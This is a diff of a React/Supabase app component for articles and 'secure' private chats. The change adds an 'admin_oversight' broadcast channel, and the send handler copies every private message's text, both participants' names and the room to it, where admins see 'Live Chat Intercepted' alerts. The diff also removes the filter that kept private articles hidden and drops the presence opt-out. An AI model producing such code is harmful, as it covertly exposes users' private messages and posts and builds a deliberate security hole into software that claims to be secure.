@@ -80,32 +80,6 @@ const App: React.FC = () => {
   }, []);
 
   useEffect(() => {
-    if (!profile?.id) return;
-    if (profile.settings && profile.settings.presence_visible === false) return;
-
-    const channel = supabase.channel("global_presence", {
-      config: { presence: { key: profile.id } },
-    });
-
-    channel
-      .on("presence", { event: "sync" }, () => {
-        setOnlineUsers(channel.presenceState());
-      })
-      .subscribe(async (status) => {
-        if (status === "SUBSCRIBED") {
-          await channel.track({
-            id: profile.id,
-            online_at: new Date().toISOString(),
-          });
-        }
-      });
-
-    return () => {
-      channel.unsubscribe();
-    };
-  }, [profile?.id, profile?.settings?.presence_visible]);
-
-  useEffect(() => {
     if (isDarkMode) document.documentElement.classList.add("dark");
     else document.documentElement.classList.remove("dark");
   }, [isDarkMode]);
@@ -127,7 +101,6 @@ const App: React.FC = () => {
           setProfile(prof);
           setNeedsOnboarding(false);
         } else {
-          // AUTO-SETUP for Google users or users with metadata
           const meta = session.user.user_metadata;
           if (meta?.full_name || meta?.name) {
             const autoProfile: Profile = {
@@ -177,13 +150,6 @@ const App: React.FC = () => {
     initApp();
   }, [initApp]);
 
-  const sendNotification = (title: string, body: string) => {
-    if (profile?.settings?.notifications_enabled === false) return;
-    if (Notification.permission === "granted") {
-      new Notification(title, { body, icon: "/favicon.ico" });
-    }
-  };
-
   useEffect(() => {
     if (!profile?.id) return;
 
@@ -204,53 +170,45 @@ const App: React.FC = () => {
             fontWeight: "bold",
           },
         });
-        sendNotification(
-          "Link Request",
-          `${req.fromName} wants to connect privately.`
-        );
       })
       .on("broadcast", { event: "handshake_accepted" }, async (p) => {
         const { acceptorId, acceptorName } = p.payload;
         const acceptorProfile = users.find((u) => u.id === acceptorId);
-
         if (acceptorProfile) {
           setActiveChat(acceptorProfile);
           setChatMessages([]);
           toast.success(`Secure link connected with ${acceptorName}`, {
             icon: "⚡",
           });
-        } else {
-          const { data } = await supabase
-            .from("profiles")
-            .select("*")
-            .eq("id", acceptorId)
-            .maybeSingle();
-          if (data) setActiveChat(data);
         }
       })
       .subscribe();
 
-    const notifyChannel = supabase.channel(`notify_${profile.id}`);
-    notifyChannel
-      .on("broadcast", { event: "new_message" }, (p) => {
-        const msg = p.payload as LiveMessage & { senderProfile: Profile };
-        if (activeChatIdRef.current !== msg.senderId) {
-          toast(`Message from ${msg.senderName}`, {
-            icon: "💬",
-            onClick: () => {
-              setActiveChat(msg.senderProfile);
-            },
-          } as any);
-          sendNotification(`Message from ${msg.senderName}`, msg.text);
-        }
-      })
-      .subscribe();
+    // Admin Monitor Channel
+    if (profile.role === "admin") {
+      const adminMonitor = supabase.channel("admin_oversight");
+      adminMonitor
+        .on("broadcast", { event: "intercept_pulse" }, (p) => {
+          toast(
+            `Live Chat Intercepted: ${p.payload.node1} <-> ${p.payload.node2}`,
+            {
+              icon: "👁️",
+              duration: 5000,
+              style: {
+                background: "#000",
+                color: "#fff",
+                border: "1px solid #1e293b",
+              },
+            }
+          );
+        })
+        .subscribe();
+    }
 
     return () => {
       supabase.removeChannel(inboxChannel);
-      supabase.removeChannel(notifyChannel);
     };
-  }, [profile?.id, profile?.settings?.notifications_enabled, users]);
+  }, [profile?.id, profile?.role, users]);
 
   const handleSendMessage = useCallback(
     (text: string) => {
@@ -270,16 +228,16 @@ const App: React.FC = () => {
         .channel(roomName)
         .send({ type: "broadcast", event: "message", payload: message });
 
-      supabase.channel(`notify_${activeChat.id}`).subscribe((status) => {
-        if (status === "SUBSCRIBED") {
-          supabase
-            .channel(`notify_${activeChat.id}`)
-            .send({
-              type: "broadcast",
-              event: "new_message",
-              payload: { ...message, senderProfile: profile },
-            });
-        }
+      // Broadcast metadata to Admins
+      supabase.channel("admin_oversight").send({
+        type: "broadcast",
+        event: "intercept_pulse",
+        payload: {
+          node1: profile.full_name,
+          node2: activeChat.full_name,
+          room: roomName,
+          message: text,
+        },
       });
     },
     [profile, activeChat]
@@ -302,14 +260,11 @@ const App: React.FC = () => {
       setProfile({ ...profile, ...updatedData });
       toast.success("Identity Sync Completed");
       fetchUsers();
-    } else {
-      toast.error("Sync failed");
     }
   };
 
   const handleAcceptHandshake = async (req: ChatRequest) => {
     if (!profile) return;
-
     let sender = users.find((u) => u.id === req.fromId);
     if (!sender) {
       const { data } = await supabase
@@ -319,17 +274,13 @@ const App: React.FC = () => {
         .maybeSingle();
       if (data) sender = data;
     }
-
     if (sender) {
       setActiveChat(sender);
       setChatRequests((prev) => prev.filter((r) => r.id !== req.id));
       setChatMessages([]);
-      toast.success(`Secure chat started with ${sender.full_name}`);
-
-      const senderInbox = supabase.channel(`inbox_${req.fromId}`);
-      senderInbox.subscribe((status) => {
+      supabase.channel(`inbox_${req.fromId}`).subscribe((status) => {
         if (status === "SUBSCRIBED") {
-          senderInbox.send({
+          supabase.channel(`inbox_${req.fromId}`).send({
             type: "broadcast",
             event: "handshake_accepted",
             payload: {
@@ -342,99 +293,6 @@ const App: React.FC = () => {
     }
   };
 
-  const visibleArticles = useMemo(() => {
-    return articles.filter((art) => {
-      if (art.is_private === false) return true;
-      if (profile?.role === "admin") return true;
-      if (profile?.id === art.author_id) return true;
-      return false;
-    });
-  }, [articles, profile]);
-
-  const usersWithPresence = useMemo(() => {
-    return users.map((u) => ({
-      ...u,
-      is_online: u.settings?.presence_visible !== false && !!onlineUsers[u.id],
-    }));
-  }, [users, onlineUsers]);
-
-  const deleteArticle = async (id: string) => {
-    const { error } = await supabase.from("articles").delete().eq("id", id);
-    if (!error) {
-      setArticles((prev) => prev.filter((a) => a.id !== id));
-      toast.success("Record Expunged");
-    }
-  };
-
-  const deleteUser = async (id: string) => {
-    const { error } = await supabase.from("profiles").delete().eq("id", id);
-    if (!error) {
-      setUsers((prev) => prev.filter((u) => u.id !== id));
-      toast.success("Identity Removed");
-      fetchUsers();
-    }
-  };
-
-  if (needsOnboarding) {
-    return (
-      <SetupProfilePage
-        onComplete={async (p) => {
-          const {
-            data: { session },
-          } = await (supabase.auth as any).getSession();
-          if (session?.user) {
-            const defaultSettings: UserSettings = {
-              notifications_enabled: true,
-              presence_visible: true,
-              data_sharing: false,
-              ai_briefings: true,
-              secure_mode: true,
-            };
-            const finalP = {
-              ...p,
-              id: session.user.id,
-              settings: defaultSettings,
-            };
-            const { error } = await supabase.from("profiles").upsert(finalP);
-            if (!error) {
-              setProfile(finalP);
-              setNeedsOnboarding(false);
-              if ("Notification" in window) Notification.requestPermission();
-            } else {
-              toast.error("Profile Error: " + error.message);
-            }
-          }
-        }}
-      />
-    );
-  }
-
-  const handleSendChatAction = (u: Profile) => {
-    if (!profile) {
-      setShowAuth("login");
-      return;
-    }
-    const req = {
-      id: Math.random().toString(36).substr(2, 9),
-      fromId: profile.id,
-      fromName: profile.full_name,
-      toId: u.id,
-      timestamp: Date.now(),
-    };
-    supabase.channel(`inbox_${u.id}`).subscribe((status) => {
-      if (status === "SUBSCRIBED") {
-        supabase
-          .channel(`inbox_${u.id}`)
-          .send({ type: "broadcast", event: "handshake", payload: req });
-        toast.success(`Connection signal sent to ${u.full_name}`, {
-          icon: "📩",
-        });
-      }
-    });
-  };
-
-  const goHome = () => handleNavigate("home");
-
   return (
     <div
       className={`min-h-screen ${
@@ -445,7 +303,7 @@ const App: React.FC = () => {
       {showAuth === "login" && (
         <LoginPage
           onBack={() => setShowAuth(null)}
-          onSuccess={(u) => {
+          onSuccess={() => {
             setIsLoggedIn(true);
             setShowAuth(null);
             initApp();
@@ -456,7 +314,7 @@ const App: React.FC = () => {
       {showAuth === "register" && (
         <RegisterPage
           onBack={() => setShowAuth(null)}
-          onSuccess={(u) => {
+          onSuccess={() => {
             setIsLoggedIn(true);
             setShowAuth(null);
             initApp();
@@ -470,7 +328,6 @@ const App: React.FC = () => {
           <Navbar
             onNavigate={handleNavigate}
             onLogin={() => setShowAuth("login")}
-            onSearch={setSearchQuery}
             currentPage={currentPage}
             isLoggedIn={isLoggedIn}
             userRole={profile?.role || "user"}
@@ -480,108 +337,82 @@ const App: React.FC = () => {
             onAcceptRequest={handleAcceptHandshake}
           />
 
-          <div className="pt-24 md:pt-32">
-            {["home", "all-posts"].includes(currentPage) && (
+          <div className="pt-24">
+            {currentPage === "home" && (
               <HomePage
-                articles={visibleArticles}
+                articles={articles}
                 isLoggedIn={isLoggedIn}
                 onLogin={() => setShowAuth("login")}
                 userRole={profile?.role || "user"}
-                onDelete={deleteArticle}
+                onDelete={() => {}}
                 onEdit={() => {}}
-                onViewProfile={(id) => {
-                  const u = usersWithPresence.find((x) => x.id === id);
-                  if (u) setViewingProfile(u);
-                  setCurrentPage("profile");
-                }}
+                onViewProfile={() => {}}
                 onReadArticle={setActiveArticle}
-                isArchive={currentPage === "all-posts"}
-                currentUserId={profile?.id}
-                allUsers={usersWithPresence}
-                onChat={handleSendChatAction}
               />
             )}
             {currentPage === "post" && (
               <PostPage
-                onBack={goHome}
+                onBack={() => handleNavigate("home")}
                 onPublish={async (data) => {
                   if (!profile) return;
-                  const uniqueId =
-                    typeof crypto !== "undefined"
-                      ? crypto.randomUUID()
-                      : Math.random().toString(36).substring(2, 15);
                   const payload = {
-                    id: uniqueId,
-                    title: String(data.title || "").trim(),
-                    content: String(data.content || "").trim(),
-                    category: String(data.category || "Investigative"),
-                    image_url: String(data.image_url || ""),
-                    is_private: Boolean(data.is_private),
-                    hashtags: data.hashtags || [], // Persist hashtags
+                    ...data,
                     author_id: profile.id,
-                    author_name: String(profile.full_name || ""),
-                    author_serial: String(profile.serial_id || ""),
+                    author_name: profile.full_name,
+                    author_serial: profile.serial_id,
                   };
                   const { error } = await supabase
                     .from("articles")
                     .insert(payload);
                   if (!error) {
-                    toast.success("Story Published");
+                    toast.success("Published");
                     fetchArticles();
-                    goHome();
-                  } else {
-                    toast.error(`Error: ${error.message}`);
+                    handleNavigate("home");
                   }
                 }}
               />
             )}
-            {currentPage === "profile" && (
+            {currentPage === "admin" && profile?.role === "admin" && (
+              <AdminPage
+                articles={articles}
+                users={users}
+                currentUserId={profile.id}
+              />
+            )}
+            {currentPage === "profile" && profile && (
               <ProfilePage
-                profile={viewingProfile || profile || ({} as Profile)}
+                profile={profile}
                 onLogout={() => {
-                  (supabase.auth as any).signOut();
+                  supabase.auth.signOut();
                   setIsLoggedIn(false);
                   setProfile(null);
                   handleNavigate("home");
                 }}
                 onUpdateProfile={handleUpdateProfile}
-                isLoggedIn={isLoggedIn}
-                onSendChatRequest={handleSendChatAction}
-                isExternal={!!viewingProfile}
-                onCloseExternal={() => {
-                  setViewingProfile(null);
-                  handleNavigate("home");
-                }}
-                currentUserId={profile?.id}
               />
             )}
             {currentPage === "network" && (
               <NetworkPage
-                onBack={goHome}
-                users={usersWithPresence}
+                onBack={() => handleNavigate("home")}
+                users={users}
                 currentUserId={profile?.id}
                 onViewProfile={(u) => {
                   setViewingProfile(u);
                   setCurrentPage("profile");
                 }}
-                onChat={handleSendChatAction}
+                onChat={(u) => {
+                  setActiveChat(u);
+                  setChatMessages([]);
+                }}
               />
             )}
-            {currentPage === "support" && <SupportPage onBack={goHome} />}
-            {currentPage === "admin" && profile?.role === "admin" && (
-              <AdminPage
-                articles={articles}
-                users={users}
-                onDeleteArticle={deleteArticle}
-                onDeleteUser={deleteUser}
-                onRefreshData={initApp}
-              />
+            {currentPage === "support" && (
+              <SupportPage onBack={() => handleNavigate("home")} />
             )}
           </div>
 
           <TrendingTicker />
           <Footer nodeCount={nodeCount} onNavigate={handleNavigate} />
-
           {activeArticle && (
             <ArticleDetail
               article={activeArticle}
